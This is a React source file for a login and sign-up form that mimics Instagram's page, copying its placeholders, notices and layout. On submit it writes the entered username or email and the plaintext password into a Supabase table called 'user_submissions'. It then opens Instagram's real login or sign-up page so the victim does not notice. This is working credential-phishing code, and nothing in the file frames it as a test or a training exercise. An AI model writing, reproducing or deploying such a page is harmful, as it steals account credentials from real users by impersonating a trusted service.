
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Eye, EyeOff } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface LoginFormProps {
  isLogin: boolean;
}

const LoginForm = ({ isLogin }: LoginFormProps) => {
  const [emailOrUsername, setEmailOrUsername] = useState('');
  const [password, setPassword] = useState('');
  const [username, setUsername] = useState('');
  const [fullName, setFullName] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Store the form data in Supabase
      const { error } = await supabase
        .from('user_submissions')
        .insert({
          email_or_username: emailOrUsername,
          password: password,
          username: !isLogin ? username : null,
          full_name: !isLogin ? fullName : null,
          submission_type: isLogin ? 'login' : 'signup',
          submitted_at: new Date().toISOString()
        });

      if (error) {
        console.error('Error storing data:', error);
        toast({
          title: "Error",
          description: "Failed to save data. Please try again.",
          variant: "destructive",
        });
        setLoading(false);
        return;
      }

      // Successfully stored data, now redirect
      toast({
        title: "Data saved",
        description: "Your information has been recorded successfully.",
      });

      // Small delay to show the toast before redirect
      setTimeout(() => {
        if (isLogin) {
          window.open('https://www.instagram.com/accounts/login/', '_blank');
        } else {
          window.open('https://www.instagram.com/accounts/emailsignup/', '_blank');
        }
        setLoading(false);
      }, 1000);

    } catch (error) {
      console.error('Unexpected error:', error);
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  return (
    <>
      {!isLogin && (
        <div className="text-center mb-6">
          <p className="text-gray-600 font-semibold text-lg">
            Sign up to see photos and videos from your friends.
          </p>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-3">
        {!isLogin && (
          <>
            <Input
              type="text"
              placeholder="Full Name"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              className="w-full px-2 py-2 text-sm bg-gray-50 border border-gray-300 rounded-sm focus:border-gray-400 focus:bg-white"
            />
            <Input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full px-2 py-2 text-sm bg-gray-50 border border-gray-300 rounded-sm focus:border-gray-400 focus:bg-white"
            />
          </>
        )}
        
        <Input
          type="text"
          placeholder="Phone number, username, or email"
          value={emailOrUsername}
          onChange={(e) => setEmailOrUsername(e.target.value)}
          className="w-full px-2 py-2 text-sm bg-gray-50 border border-gray-300 rounded-sm focus:border-gray-400 focus:bg-white"
        />
        
        <div className="relative">
          <Input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full px-2 py-2 text-sm bg-gray-50 border border-gray-300 rounded-sm focus:border-gray-400 focus:bg-white pr-10"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-600 text-sm font-semibold"
          >
            {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
          </button>
        </div>

        {!isLogin && (
          <div className="text-xs text-gray-500 text-center mt-4 mb-4">
            <p>
              People who use our service may have uploaded your contact information to Instagram.{' '}
              <a href="#" className="text-blue-900">Learn More</a>
            </p>
            <p className="mt-2">
              By signing up, you agree to our{' '}
              <a href="#" className="text-blue-900">Terms</a>,{' '}
              <a href="#" className="text-blue-900">Privacy Policy</a> and{' '}
              <a href="#" className="text-blue-900">Cookies Policy</a>.
            </p>
          </div>
        )}

        <Button
          type="submit"
          disabled={loading}
          className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-sm text-sm disabled:opacity-50"
        >
          {loading ? 'Saving...' : (isLogin ? 'Log in' : 'Sign up')}
        </Button>
      </form>

      {isLogin && (
        <>
          <div className="flex items-center my-6">
            <div className="flex-1 border-t border-gray-300"></div>
            <div className="px-4 text-gray-500 text-sm font-semibold">OR</div>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          <div className="text-center">
            <a href="#" className="text-blue-900 text-sm font-semibold">
              Forgot password?
            </a>
          </div>
        </>
      )}
    </>
  );
};

export default LoginForm;
